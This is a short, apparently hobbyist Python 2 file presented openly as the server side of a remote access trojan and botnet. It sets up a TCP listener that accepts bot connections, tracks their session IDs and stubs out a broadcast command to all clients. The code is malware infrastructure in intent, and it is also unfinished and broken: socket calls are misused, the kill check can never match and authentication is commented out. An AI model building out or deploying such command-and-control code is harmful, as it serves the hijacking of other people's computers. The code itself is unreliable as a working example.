# A Python RAT n' Botnet
#  by Landon in Python2
#    SERVER-SIDE C0DE

import socket, hashlib, thread

def hash(string):
    return hashlib.sha512(
        string.encode('utf-8')
    ).digest()

# password    = hash( raw_input("Password? > ") ) # To-do: Uncomment this.
proles      = {} # An IP to SID dictionary.
innerParty  = [] # List of Authorized SIDs.

hostName, portNumber = "127.0.0.1" or socket.gethostname(), 8080

serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket . bind(( hostName, portNumber )) # To-do: PORT CHANGE LATER
serverSocket . listen(10)

def clientHandler(connection):
    message = ""
    while message != "kill":
        message = connection.recv(2048).split(" ", 2)

        if message[0] == "all":
            serverSocket.sendall()

        print(message)

    connection.close()

turnedOn = True
while turnedOn: # *Wink wink nudge nudge*
    (clientSocket, address) = serverSocket.accept()
    thread.start_new_thread( 
        clientHandler,
        ( clientSocket ,)
    )
    print( address )